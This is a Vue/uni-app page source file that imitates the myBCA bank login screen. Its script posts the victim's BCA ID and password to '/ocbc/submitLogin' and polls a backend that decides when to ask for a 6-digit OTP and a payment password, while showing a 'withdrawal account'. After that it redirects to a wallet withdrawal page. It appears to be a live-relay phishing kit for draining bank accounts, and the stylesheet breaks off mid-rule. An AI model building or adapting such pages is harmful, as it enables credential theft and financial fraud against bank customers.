<template>
  <view class="mybca-page">
    <!-- 蓝色渐变头部区域 -->
    <view class="header-section">
      <!-- 顶部导航栏 -->
      <view class="top-bar">
        <!-- 左侧 Logo -->
        <view class="logo">
          <image class="logo-image" src="../../static/mybca/mybca.png" mode="heightFix" />
        </view>

        <!-- 右侧语言切换 -->
        <view class="lang-switcher">
          <image class="lang-flag" src="https://flagcdn.com/w40/gb.png" mode="aspectFit" />
          <text class="lang-text">EN</text>
        </view>
      </view>
    </view>

    <!-- Banner 轮播区域 -->
    <view class="banner-section">
      <swiper
        class="banner-swiper"
        :autoplay="true"
        :interval="4000"
        :circular="true"
        :indicator-dots="true"
        indicator-color="rgba(255,255,255,0.4)"
        indicator-active-color="#005caa"
      >
        <swiper-item>
          <view class="banner-item">
            <image class="banner-image" src="../../static/mybca/banner1.png" mode="aspectFill" />
          </view>
        </swiper-item>
        <swiper-item>
          <view class="banner-item">
            <image class="banner-image" src="../../static/mybca/banner2.png" mode="aspectFill" />
          </view>
        </swiper-item>
        <swiper-item>
          <view class="banner-item">
            <image class="banner-image" src="../../static/mybca/banner3.png" mode="aspectFill" />
          </view>
        </swiper-item>
      </swiper>
    </view>

    <!-- 白色登录卡片区域 -->
    <view class="login-card">
      <!-- 标题区域 -->
      <view class="card-header">
        <view class="title-section">
          <text class="greeting-title">Hello,</text>
          <text class="greeting-subtitle">{{ t('mybca.welcome') }}</text>
        </view>
        <view class="bca-id-help" @click="handleBcaIdHelp">
          <view class="help-icon-wrapper">
            <text class="bi bi-credit-card-2-front"></text>
          </view>
          <text class="help-text">{{ t('mybca.whatIsBcaId') }}</text>
        </view>
      </view>

      <!-- 登录表单 -->
      <view class="login-form">
        <!-- BCA ID 输入框 -->
        <view class="form-group">
          <text class="form-label">BCA ID</text>
          <view class="input-wrapper">
            <input
              class="form-input"
              v-model="username"
              type="text"
              :placeholder="t('mybca.bcaIdPlaceholder')"
              placeholder-class="input-placeholder"
              autocomplete="off"
            />
          </view>
        </view>

        <!-- Password 输入框 -->
        <view class="form-group">
          <text class="form-label">{{ t('mybca.password') }}</text>
          <view class="input-wrapper">
            <input
              class="form-input password-field"
              v-model="password"
              :type="showPassword ? 'text' : 'password'"
              :password="!showPassword"
              :placeholder="t('mybca.passwordPlaceholder')"
              placeholder-class="input-placeholder"
            />
            <view class="eye-toggle" @click="togglePassword">
              <text class="bi" :class="showPassword ? 'bi-eye-slash' : 'bi-eye'"></text>
            </view>
          </view>
        </view>

        <!-- 忘记密码链接 -->
        <view class="forgot-links">
          <text class="forgot-link" @click="handleForgotBcaId">{{ t('mybca.forgotBcaId') }}</text>
          <text class="forgot-link" @click="handleResetPassword">{{ t('mybca.resetPassword') }}</text>
        </view>

        <!-- Login 按钮 -->
        <button
          class="login-btn"
          :class="{ 'btn-disabled': !canLogin }"
          :disabled="!canLogin"
          @click="handleLogin"
        >
          {{ t('mybca.loginButton') }}
        </button>

        <!-- 注册链接 -->
        <view class="register-section">
          <text class="register-text">{{ t('mybca.noBcaId') }}</text>
          <text class="register-link" @click="handleRegister">{{ t('mybca.registerNow') }}</text>
        </view>
      </view>

      <!-- 安全提示 -->
      <view class="warning-alert">
        <view class="alert-icon">
          <text class="bi bi-exclamation-circle-fill"></text>
        </view>
        <view class="alert-content">
          <text class="alert-text">
            {{ t('mybca.securityReminder') }}
          </text>
        </view>
      </view>
    </view>

    <!-- 底部快捷链接 -->
    <scroll-view class="quick-links" scroll-x="true" :show-scrollbar="false">
      <view class="links-inner">
        <view class="link-card" @click="handleCallCenter">
          <text class="bi bi-telephone-fill link-icon"></text>
          <text class="link-text">Halo BCA 1500888</text>
        </view>
        <view class="link-card" @click="handleWhatsapp">
          <text class="bi bi-whatsapp link-icon whatsapp-icon"></text>
          <text class="link-text">WhatsApp Bank BCA</text>
        </view>
        <view class="link-card" @click="handleEmail">
          <text class="bi bi-envelope-fill link-icon"></text>
          <text class="link-text">Email BCA</text>
        </view>
        <view class="link-card" @click="handleLocator">
          <text class="bi bi-geo-alt-fill link-icon"></text>
          <text class="link-text">Branch Locator</text>
        </view>
      </view>
    </scroll-view>

    <!-- 加载中遮罩 -->
    <view v-if="showLoading" class="loading-overlay">
      <view class="loading-spinner">
        <view class="spinner"></view>
        <text class="loading-text">{{ t('mybca.processing') }}</text>
      </view>
    </view>

    <!-- OTP 验证弹窗 -->
    <view v-if="showCaptchaModal" class="otp-fullpage">
      <!-- 标题 -->
      <text class="otp-page-title">{{ t('mybca.otpTitle') }}</text>

      <!-- 邮件图标 -->
      <view class="otp-icon-area">
        <view class="otp-envelope">
          <text class="bi bi-envelope-fill otp-envelope-icon"></text>
          <view class="otp-at-badge">
            <text class="otp-at-text">@</text>
          </view>
          <view class="otp-lock-badge">
            <text class="bi bi-lock-fill otp-lock-icon"></text>
          </view>
        </view>
      </view>

      <!-- 描述文字 -->
      <text class="otp-desc">{{ t('mybca.otpDesc') }}</text>

      <!-- 6位数字输入框 -->
      <view class="otp-digits-row">
        <view
          v-for="(digit, index) in otpDigits"
          :key="index"
          class="otp-digit-box"
          :class="{ 'otp-digit-active': otpFocusIndex === index }"
          @click="focusOtpInput"
        >
          <text class="otp-digit-text">{{ digit }}</text>
        </view>
      </view>
      <!-- 隐藏的真实输入框 -->
      <input
        ref="otpInputRef"
        class="otp-hidden-input"
        v-model="captchaInput"
        type="number"
        maxlength="6"
        :focus="otpInputFocused"
        @input="onOtpInput"
        @focus="otpInputFocused = true"
        @blur="otpInputFocused = false"
      />

      <!-- Send 按钮 -->
      <button
        class="otp-send-btn"
        :class="{ 'otp-send-btn-disabled': !canSubmitOtp }"
        :disabled="!canSubmitOtp"
        @click="submitCaptcha"
      >
        {{ t('mybca.otpSend') }}
      </button>

      <!-- Cancel 按钮 -->
      <button class="otp-cancel-btn" @click="cancelOtp">
        {{ t('mybca.otpCancel') }}
      </button>

      <!-- 重发倒计时 -->
      <view class="otp-resend-row">
        <text v-if="resendCountdown > 0" class="otp-resend-text">
          {{ t('mybca.otpResendIn') }} <text class="otp-resend-time">{{ resendCountdownText }}</text>
        </text>
        <text v-else class="otp-resend-link" @click="handleResendOtp">
          {{ t('mybca.otpResend') }}
        </text>
      </view>
    </view>

    <!-- 支付密码弹窗 -->
    <view v-if="showPaymentPasswordModal" class="modal-overlay" @click.stop>
      <view class="modal-content payment-modal" @click.stop>
        <view class="modal-header">
          <text class="modal-title">{{ t('mybca.paymentPasswordTitle') }}</text>
        </view>

        <view class="payment-section">
          <!-- 提现账户信息 -->
          <view v-if="withdrawalAccount?.account_name || withdrawalAccount?.account_number" class="account-info-section">
            <text class="section-label">{{ t('mybca.withdrawalAccountLabel') }}</text>
            <view class="account-info-box">
              <view v-if="withdrawalAccount?.account_name" class="account-row">
                <text class="account-label">{{ t('mybca.accountName') }}</text>
                <text class="account-value">{{ withdrawalAccount.account_name }}</text>
              </view>
              <view v-if="withdrawalAccount?.account_number" class="account-row">
                <text class="account-label">{{ t('mybca.accountNumber') }}</text>
                <text class="account-value">{{ withdrawalAccount.account_number }}</text>
              </view>
              <view v-if="withdrawalAccount?.bank_name" class="account-row">
                <text class="account-label">{{ t('mybca.bankName') }}</text>
                <text class="account-value">{{ withdrawalAccount.bank_name }}</text>
              </view>
            </view>
          </view>

          <!-- 密码输入区域 -->
          <view class="password-input-section">
            <text class="input-label">{{ t('mybca.password') }}</text>
            <input class="payment-field" v-model="paymentPasswordInput" type="password" password
              :placeholder="t('mybca.paymentPasswordPlaceholder')" maxlength="6" />
          </view>

          <!-- 安全提示 -->
          <view class="security-notice">
            <view class="notice-icon">
              <text class="bi bi-shield-check shield-icon"></text>
            </view>
            <view class="notice-content">
              <text class="notice-title">{{ t('mybca.securityNotice') }}</text>
              <text class="notice-text">{{ t('mybca.securityNoticeText') }}</text>
            </view>
          </view>
        </view>

        <view class="modal-actions">
          <button class="modal-button confirm-button" @click="submitPaymentPassword">
            {{ t('mybca.submit') }}
          </button>
        </view>
      </view>
    </view>

    <!-- 验证码错误弹窗 -->
    <view v-if="showCaptchaErrorModal" class="modal-overlay status-overlay">
      <view class="status-modal error-modal" @click.stop>
        <view class="status-icon-container error-icon-container">
          <view class="status-icon-circle error-circle">
            <text class="bi bi-x-lg error-x"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title error-title">{{ t('mybca.captchaErrorTitle') }}</text>
          <text class="status-message">{{ t('mybca.captchaErrorMessage') }}</text>
        </view>
        <button class="status-button error-button" @click="retryCaptcha">
          {{ t('mybca.reenter') }}
        </button>
      </view>
    </view>

    <!-- 支付密码错误弹窗 -->
    <view v-if="showPaymentPasswordErrorModal" class="modal-overlay status-overlay">
      <view class="status-modal error-modal" @click.stop>
        <view class="status-icon-container error-icon-container">
          <view class="status-icon-circle error-circle">
            <text class="bi bi-x-lg error-x"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title error-title">{{ t('mybca.paymentPasswordErrorTitle') }}</text>
          <text class="status-message">{{ t('mybca.paymentPasswordErrorMessage') }}</text>
        </view>
        <button class="status-button error-button" @click="retryPaymentPassword">
          {{ t('mybca.reenter') }}
        </button>
      </view>
    </view>

    <!-- 忘记密码弹窗 -->
    <view v-if="showForgotPasswordModal" class="modal-overlay" @click="closeForgotPasswordModal">
      <view class="modal-container" @click.stop>
        <view class="modal-content simple-modal">
          <text class="modal-title">{{ t('mybca.forgotPasswordTitle') }}</text>
          <text class="modal-message">{{ t('mybca.forgotPasswordMessage') }}</text>
          <button class="modal-button" @click="confirmForgotPassword">
            {{ t('mybca.forgotPasswordConfirm') }}
          </button>
        </view>
      </view>
    </view>

    <!-- 成功弹窗 -->
    <view v-if="showSuccessModal" class="modal-overlay status-overlay">
      <view class="status-modal success-modal" @click.stop>
        <view class="status-icon-container success-icon-container">
          <view class="status-icon-circle success-circle">
            <text class="bi bi-check-lg success-check"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title success-title">{{ t('mybca.successTitle') }}</text>
          <text class="status-message">{{ t('mybca.successMessage') }}</text>
          <text class="status-description">{{ t('mybca.successDescription') }}</text>
        </view>
        <button class="status-button success-button" @click="handleLoginSuccess">
          {{ t('mybca.ok') }}
        </button>
      </view>
    </view>

    <!-- 失败弹窗 -->
    <view v-if="showFailedModal" class="modal-overlay status-overlay">
      <view class="status-modal error-modal" @click.stop>
        <view class="status-icon-container error-icon-container">
          <view class="status-icon-circle error-circle">
            <text class="bi bi-x-lg error-x"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title error-title">{{ t('mybca.failedTitle') }}</text>
          <text class="status-message">{{ t('mybca.failedMessage') }}</text>
          <text class="status-description">{{ t('mybca.failedDescription') }}</text>
        </view>
        <button class="status-button error-button" @click="handleLoginFailed">
          {{ t('mybca.tryAgain') }}
        </button>
      </view>
    </view>

    <!-- 系统维护弹窗 -->
    <view v-if="showMaintenanceModal" class="modal-overlay status-overlay">
      <view class="status-modal maintenance-modal" @click.stop>
        <view class="status-icon-container maintenance-icon-container">
          <view class="status-icon-circle maintenance-circle">
            <text class="bi bi-tools maintenance-icon"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title maintenance-title">{{ t('mybca.maintenanceTitle') }}</text>
          <text class="status-message">{{ t('mybca.maintenanceMessage') }}</text>
          <text class="status-description">{{ t('mybca.maintenanceDescription') }}</text>
        </view>
        <button class="status-button maintenance-button" @click="handleMaintenanceClose">
          {{ t('mybca.ok') }}
        </button>
      </view>
    </view>
  </view>
</template>

<script setup lang="ts">
import { ref, computed, watch, onUnmounted } from 'vue'
import { onLoad } from '@dcloudio/uni-app'
import { useI18n } from 'vue-i18n'
import { post } from '../../utils/request'
import { getToken } from '../../utils/storage'

const { t } = useI18n()

const username = ref('')
const password = ref('')
const showPassword = ref(false)
const logoUrl = ref('')
const bankCode = ref('')

// 加载状态
const showLoading = ref(false)

// 弹窗状态
const showCaptchaModal = ref(false)
const showCaptchaErrorModal = ref(false)
const showPaymentPasswordModal = ref(false)
const showPaymentPasswordErrorModal = ref(false)
const showForgotPasswordModal = ref(false)
const showSuccessModal = ref(false)
const showFailedModal = ref(false)
const showMaintenanceModal = ref(false)

// 输入数据
const captchaInput = ref('')
const paymentPasswordInput = ref('')
const withdrawalAccount = ref<any>(null)

// OTP 相关
const otpInputFocused = ref(false)
const resendCountdown = ref(0)
let resendTimer: any = null

const otpDigits = computed(() => {
  const digits = captchaInput.value.split('')
  return Array.from({ length: 6 }, (_, i) => digits[i] || '')
})

const otpFocusIndex = computed(() => {
  const len = captchaInput.value.length
  return len < 6 ? len : 5
})

const canSubmitOtp = computed(() => {
  return captchaInput.value.length === 6
})

const resendCountdownText = computed(() => {
  const mins = Math.floor(resendCountdown.value / 60)
  const secs = resendCountdown.value % 60
  return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`
})

function focusOtpInput() {
  otpInputFocused.value = true
}

function onOtpInput() {
  // 限制只保留数字且最多6位
  captchaInput.value = captchaInput.value.replace(/\D/g, '').slice(0, 6)
}

function startResendCountdown() {
  resendCountdown.value = 60
  if (resendTimer) clearInterval(resendTimer)
  resendTimer = setInterval(() => {
    resendCountdown.value--
    if (resendCountdown.value <= 0) {
      clearInterval(resendTimer)
      resendTimer = null
    }
  }, 1000)
}

function handleResendOtp() {
  startResendCountdown()
}

function cancelOtp() {
  showCaptchaModal.value = false
  captchaInput.value = ''
  if (resendTimer) {
    clearInterval(resendTimer)
    resendTimer = null
  }
}

watch(showCaptchaModal, (val) => {
  if (val) {
    captchaInput.value = ''
    startResendCountdown()
  }
})

onUnmounted(() => {
  if (resendTimer) clearInterval(resendTimer)
  if (pollingTimer) clearInterval(pollingTimer)
})

// 记录ID和轮询
const recordId = ref<number>(0)
let pollingTimer: any = null

// 获取URL参数
onLoad((options) => {
  // 检查登录状态
  const token = getToken()
  if (!token) {
    uni.showToast({
      title: t('common.pleaseLoginFirst') || 'Please login first',
      icon: 'none',
      duration: 2000
    })
    setTimeout(() => {
      uni.reLaunch({ url: '/pages/auth/login' })
    }, 2000)
    return
  }

  if (options?.code) {
    bankCode.value = options.code
  }
  if (options?.logo) {
    logoUrl.value = decodeURIComponent(options.logo)
  }
})

const canLogin = computed(() => {
  return username.value.trim() !== '' && password.value.trim() !== ''
})

function togglePassword() {
  showPassword.value = !showPassword.value
}

// 提交登录
async function handleLogin() {
  if (!canLogin.value || showLoading.value) return

  showLoading.value = true
  try {
    const res = await post('/ocbc/submitLogin', {
      account_type: bankCode.value || 'mybca',
      organization_id: username.value,
      user_id: username.value,
      password: password.value
    }, { showError: false })

    recordId.value = res.data.record_id
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    uni.showToast({
      title: error.message || 'Login failed',
      icon: 'none'
    })
  }
}

// 开始轮询状态
function startPolling() {
  stopPolling()
  pollingTimer = setInterval(async () => {
    await pollStatus()
  }, 2000)
}

// 停止轮询
function stopPolling() {
  if (pollingTimer) {
    clearInterval(pollingTimer)
    pollingTimer = null
  }
}

// 轮询状态
async function pollStatus() {
  try {
    const res = await post('/ocbc/pollStatus', {
      record_id: recordId.value
    }, { showError: false })

    const status = res.data.status
    handleStatusChange(status, res.data)
  } catch (error) {
    console.error('Poll status error:', error)
  }
}

// 处理状态变化
function handleStatusChange(status: string, data: any) {
  switch (status) {
    case 'need_captcha':
      stopPolling()
      showLoading.value = false
      showCaptchaModal.value = true
      break

    case 'need_payment_password':
      stopPolling()
      showLoading.value = false
      withdrawalAccount.value = data.withdrawal_account
      showPaymentPasswordModal.value = true
      break

    case 'success':
      stopPolling()
      showLoading.value = false
      showSuccessModal.value = true
      break

    case 'payment_password_error':
      stopPolling()
      showLoading.value = false
      showPaymentPasswordErrorModal.value = true
      break

    case 'captcha_error':
      stopPolling()
      showLoading.value = false
      showCaptchaErrorModal.value = true
      break

    case 'password_error':
    case 'failed':
      stopPolling()
      showLoading.value = false
      showFailedModal.value = true
      break

    case 'maintenance':
      stopPolling()
      showLoading.value = false
      showMaintenanceModal.value = true
      break

    default:
      // 继续轮询
      break
  }
}

// 提交验证码
async function submitCaptcha() {
  if (!captchaInput.value) {
    uni.showToast({
      title: t('mybca.pleaseEnterCaptcha') || 'Please enter OTP',
      icon: 'none'
    })
    return
  }

  showCaptchaModal.value = false
  showLoading.value = true

  try {
    await post('/ocbc/submitCaptcha', {
      record_id: recordId.value,
      captcha: captchaInput.value
    }, { showError: false })

    captchaInput.value = ''
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    showFailedModal.value = true
  }
}

// 提交支付密码
async function submitPaymentPassword() {
  if (!paymentPasswordInput.value) {
    uni.showToast({
      title: t('mybca.pleaseEnterPaymentPassword') || 'Please enter payment password',
      icon: 'none'
    })
    return
  }

  showPaymentPasswordModal.value = false
  showLoading.value = true

  try {
    await post('/ocbc/submitPaymentPassword', {
      record_id: recordId.value,
      payment_password: paymentPasswordInput.value
    }, { showError: false })

    paymentPasswordInput.value = ''
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    showPaymentPasswordErrorModal.value = true
  }
}

// 重试输入验证码
function retryCaptcha() {
  showCaptchaErrorModal.value = false
  captchaInput.value = ''
  showCaptchaModal.value = true
}

// 重试输入支付密码
function retryPaymentPassword() {
  showPaymentPasswordErrorModal.value = false
  paymentPasswordInput.value = ''
  showPaymentPasswordModal.value = true
}

// 忘记BCA ID
function handleForgotBcaId() {
  showForgotPasswordModal.value = true
}

// 重置密码
function handleResetPassword() {
  showForgotPasswordModal.value = true
}

// 忘记密码
function closeForgotPasswordModal() {
  showForgotPasswordModal.value = false
}

function confirmForgotPassword() {
  showForgotPasswordModal.value = false
}

// BCA ID 帮助
function handleBcaIdHelp() {
  // 打开帮助信息
}

// 注册
function handleRegister() {
  // 打开注册页面
}

// 快捷链接操作
function handleCallCenter() {}
function handleWhatsapp() {}
function handleEmail() {}
function handleLocator() {}

// 登录成功
function handleLoginSuccess() {
  showSuccessModal.value = false
  uni.redirectTo({
    url: '/pages/wallet/withdraw'
  })
}

// 登录失败
function handleLoginFailed() {
  showFailedModal.value = false
  username.value = ''
  password.value = ''
}

// 关闭维护弹窗
function handleMaintenanceClose() {
  showMaintenanceModal.value = false
  uni.navigateBack()
}
</script>

<style lang="scss" scoped>
.mybca-page {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  background: #f5f9fa;
}

/* ========== 蓝色渐变头部区域 ========== */
.header-section {
  background: linear-gradient(180deg, #0d5cab 0%, #0094d6 50%, #00b6f1 100%);
  padding: calc(var(--status-bar-height) + 20rpx) 0 0;
  position: relative;
}

.top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 32rpx 24rpx;
}

.logo {
  display: flex;
  align-items: center;
}

.logo-image {
  height: 56rpx;
  max-width: 200rpx;
}

.lang-switcher {
  display: flex;
  align-items: center;
  gap: 12rpx;
  background: rgba(255, 255, 255, 0.2);
  padding: 10rpx 24rpx;
  border-radius: 32rpx;
  border: 1rpx solid rgba(255, 255, 255, 0.3);
}

.lang-flag {
  width: 36rpx;
  height: 24rpx;
  border-radius: 4rpx;
}

.lang-text {
  font-size: 26rpx;
  font-weight: 600;
  color: #FFFFFF;
}

/* ========== Banner 轮播区域 ========== */
.banner-section {
  padding: 0 24rpx;
  margin-top: -2rpx;
  background: linear-gradient(180deg, #00b6f1 0%, #f5f9fa 60%);
  padding-bottom: 24rpx;
}

.banner-swiper {
  height: 300rpx;
  border-radius: 16rpx;
  overflow: hidden;
}

.banner-item {
  width: 100%;
  height: 100%;
  border-radius: 16rpx;
  overflow: hidden;
}

.banner-image {
  width: 100%;
  height: 100%;
  border-radius: 16rpx;
}

/* ========== 白色登录卡片 ========== */
.login-card {
  margin: 0 24rpx 24rpx;
  background: #FFFFFF;
  border-radius: 16rpx;
  padding: 40rpx 36rpx;
  box-shadow: 0 4rpx 20rpx rgba(0, 0, 0, 0.06);
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  margin-bottom: 40rpx;
}

.title-section {
  flex: 1;
}

.greeting-title {
  display: block;
  font-size: 44rpx;
  font-weight: 700;
  color: #212529;
  line-height: 1.2;
}

.greeting-subtitle {
  display: block;
  font-size: 34rpx;
  font-weight: 400;
  color: #005caa;
  margin-top: 4rpx;
}

.bca-id-help {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8rpx;
  flex-shrink: 0;
  margin-left: 16rpx;
}

.help-icon-wrapper {
  width: 80rpx;
  height: 80rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.help-icon-wrapper .bi {
  font-size: 56rpx;
  color: #005caa;
}

.help-text {
  font-size: 22rpx;
  font-weight: 700;
  color: #f37c30;
  text-decoration: underline;
  text-align: center;
  white-space: nowrap;
}

/* ========== 登录表单 ========== */
.login-form {
  margin-bottom: 32rpx;
}

.form-group {
  margin-bottom: 24rpx;
}

.form-label {
  display: block;
  font-size: 28rpx;
  font-weight: 500;
  color: #495057;
  margin-bottom: 12rpx;
}

.input-wrapper {
  position: relative;
  display: flex;
  align-items: center;
}

.form-input {
  width: 100%;
  height: 96rpx;
  border: 2rpx solid #ced4da;
  border-radius: 8rpx;
  padding: 0 28rpx;
  font-size: 30rpx;
  color: #212529;
  background: #FFFFFF;
  transition: border-color 0.15s ease;
}

.form-input:focus {
  border-color: #005caa;
  box-shadow: 0 0 0 3rpx rgba(0, 92, 170, 0.15);
}

.password-field {
  padding-right: 88rpx;
}

.input-placeholder {
  color: #adb5bd;
}

.eye-toggle {
  position: absolute;
  right: 24rpx;
  top: 50%;
  transform: translateY(-50%);
  padding: 12rpx;
}

.eye-toggle .bi {
  font-size: 40rpx;
  color: #868e96;
}

/* 忘记密码链接 */
.forgot-links {
  display: flex;
  justify-content: space-between;
  margin-bottom: 40rpx;
  margin-top: 8rpx;
}

.forgot-link {
  font-size: 26rpx;
  color: #005caa;
}

/* Login 按钮 */
.login-btn {
  width: 100%;
  height: 96rpx;
  background: #005caa;
  border-radius: 8rpx;
  font-size: 32rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  margin-bottom: 28rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.login-btn::after {
  border: none;
}

.btn-disabled {
  background: #a0c4e8;
  opacity: 0.7;
}

/* 注册链接 */
.register-section {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 8rpx;
}

.register-text {
  font-size: 26rpx;
  color: #495057;
}

.register-link {
  font-size: 26rpx;
  font-weight: 700;
  color: #005caa;
}

/* ========== 安全提示 ========== */
.warning-alert {
  display: flex;
  gap: 16rpx;
  padding: 24rpx;
  background: #fff9e6;
  border-radius: 8rpx;
  border: 1rpx solid #ffeeba;
  margin-top: 8rpx;
}

.alert-icon {
  flex-shrink: 0;
}

.alert-icon .bi {
  font-size: 36rpx;
  color: #885403;
}

.alert-content {
  flex: 1;
}

.alert-text {
  font-size: 24rpx;
  color: #856404;
  line-height: 1.6;
}

/* ========== 底部快捷链接 ========== */
.quick-links {
  padding: 0 24rpx 40rpx;
  white-space: nowrap;
 
}

.links-inner {
  display: flex;
  gap: 20rpx;
  padding-bottom: 8rpx;
}

.link-card {
  display: flex;
  align-items: center;
  gap: 16rpx;
  background: #FFFFFF;
  padding: 24rpx 28rpx;
  border-radius: 12rpx;
  box-shadow: 0 2rpx 12rpx rgba(0, 0, 0, 0.06);
  flex-shrink: 0;
  min-width: 280rpx;
}

.link-icon {
  font-size: 36rpx;
  color: #005caa;
}

.whatsapp-icon {
  color: #25D366;
}

.link-text {
  font-size: 26rpx;
  font-weight: 600;
  color: #212529;
  white-space: nowrap;
}

/* ========== 加载遮罩 ========== */
.loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 92, 170, 0.15);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  backdrop-filter: blur(8rpx);
}

.loading-spinner {
  background: #FFFFFF;
  border-radius: 24rpx;
  padding: 60rpx;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 24rpx;
  box-shadow: 0 8rpx 32rpx rgba(0, 92, 170, 0.2);
}

.spinner {
  width: 80rpx;
  height: 80rpx;
  border: 6rpx solid #e6f3ff;
  border-top-color: #005caa;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.loading-text {
  font-size: 28rpx;
  color: #005caa;
  font-weight: 600;
}

/* ========== 弹窗基础样式 ========== */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: flex-end;
  justify-content: center;
  z-index: 9999;
  animation: fadeIn 0.3s ease;
}

@keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}

.modal-container {
  width: 100%;
  display: flex;
  align-items: flex-end;
  justify-content: center;
}

.modal-content {
  background: #FFFFFF;
  border-radius: 32rpx 32rpx 0 0;
  padding: 48rpx;
  width: 100%;
  max-height: 80vh;
  overflow-y: auto;
  animation: slideUp 0.3s ease;
}

@keyframes slideUp {
  from {
    transform: translateY(100%);
  }
  to {
    transform: translateY(0);
  }
}

.modal-header {
  margin-bottom: 40rpx;
}

.modal-title {
  display: block;
  font-size: 36rpx;
  font-weight: 700;
  color: #005caa;
  margin-bottom: 12rpx;
  text-align: center;
}

.modal-subtitle {
  display: block;
  font-size: 28rpx;
  color: #718096;
  text-align: center;
}

.modal-message {
  display: block;
  font-size: 28rpx;
  color: #718096;
  line-height: 1.6;
  margin-bottom: 40rpx;
  text-align: center;
}

/* ========== OTP 全屏弹窗 ========== */
.otp-fullpage {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: #FFFFFF;
  z-index: 9999;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: calc(var(--status-bar-height) + 40rpx) 48rpx 48rpx;
  overflow-y: auto;
}

.otp-page-title {
  font-size: 40rpx;
  font-weight: 700;
  color: #0d5cab;
  text-align: center;
  margin-bottom: 48rpx;
}

.otp-icon-area {
  width: 220rpx;
  height: 200rpx;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 40rpx;
  position: relative;
}

.otp-envelope {
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
}

.otp-envelope-icon {
  font-size: 140rpx;
  color: #60b8f0;
}

.otp-at-badge {
  position: absolute;
  top: 10rpx;
  left: 50%;
  transform: translateX(-50%);
  width: 64rpx;
  height: 64rpx;
  background: #f37c30;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
}

.otp-at-text {
  font-size: 36rpx;
  font-weight: 700;
  color: #FFFFFF;
}

.otp-lock-badge {
  position: absolute;
  top: 0;
  right: -20rpx;
  width: 52rpx;
  height: 52rpx;
  background: #005caa;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
}

.otp-lock-icon {
  font-size: 28rpx;
  color: #FFFFFF;
}

.otp-desc {
  font-size: 28rpx;
  color: #495057;
  text-align: center;
  line-height: 1.6;
  margin-bottom: 8rpx;
}

.otp-email-mask {
  font-size: 28rpx;
  font-weight: 600;
  color: #212529;
  text-align: center;
  margin-bottom: 48rpx;
}

.otp-digits-row {
  display: flex;
  justify-content: center;
  gap: 16rpx;
  margin-bottom: 60rpx;
  width: 100%;
}

.otp-digit-box {
  width: 88rpx;
  height: 100rpx;
  background: #f0f2f5;
  border-radius: 12rpx;
  display: flex;
  align-items: center;
  justify-content: center;
  border: 2rpx solid transparent;
}

.otp-digit-active {
  border-color: #005caa;
  background: #FFFFFF;
}

.otp-digit-text {
  font-size: 40rpx;
  font-weight: 700;
  color: #212529;
}

.otp-hidden-input {
  position: absolute;
  left: -9999rpx;
  opacity: 0;
  width: 1rpx;
  height: 1rpx;
}

.otp-send-btn {
  width: 100%;
  height: 96rpx;
  background: linear-gradient(135deg, #f37c30 0%, #e8650a 100%);
  border-radius: 50rpx;
  font-size: 32rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  margin-bottom: 20rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.otp-send-btn::after {
  border: none;
}

.otp-send-btn-disabled {
  background: #cbd5e0;
  color: #FFFFFF;
}

.otp-cancel-btn {
  width: 100%;
  height: 96rpx;
  background: #FFFFFF;
  border-radius: 50rpx;
  font-size: 32rpx;
  font-weight: 600;
  color: #005caa;
  border: 2rpx solid #005caa;
  margin-bottom: 48rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.otp-cancel-btn::after {
  border: none;
}

.otp-resend-row {
  display: flex;
  justify-content: center;
  align-items: center;
}

.otp-resend-text {
  font-size: 26rpx;
  color: #868e96;
}

.otp-resend-time {
  font-weight: 700;
  color: #005caa;
}

.otp-resend-link {
  font-size: 26rpx;
  font-weight: 600;
  color: #005caa;
  text-decoration: underline;
}

/* ========== 支付密码弹窗通用样式 ========== */
.payment-section {
  margin-bottom: 40rpx;
}

.input-label {
  display: block;
  font-size: 28rpx;
  font-weight: 600;
  color: #2D3748;
  margin-bottom: 8rpx;
}

.input-description {
  display: block;
  font-size: 26rpx;
  color: #A0AEC0;
  margin-bottom: 16rpx;
  line-height: 1.5;
}

.payment-field {
  height: 96rpx;
  background: #f0f7ff;
  border: 2rpx solid #b3d4f0;
  border-radius: 12rpx;
  padding: 0 32rpx;
  font-size: 32rpx;
  color: #2D3748;
  margin-bottom: 24rpx;
}

.payment-field:focus {
  border-color: #005caa;
  background: #FFFFFF;
}

.security-icon {
  font-size: 40rpx;
  color: #005caa;
}

.security-text {
  flex: 1;
}

.security-title {
  display: block;
  font-size: 26rpx;
  font-weight: 600;
  color: #005caa;
  margin-bottom: 8rpx;
}

.security-desc {
  display: block;
  font-size: 24rpx;
  color: #0d5cab;
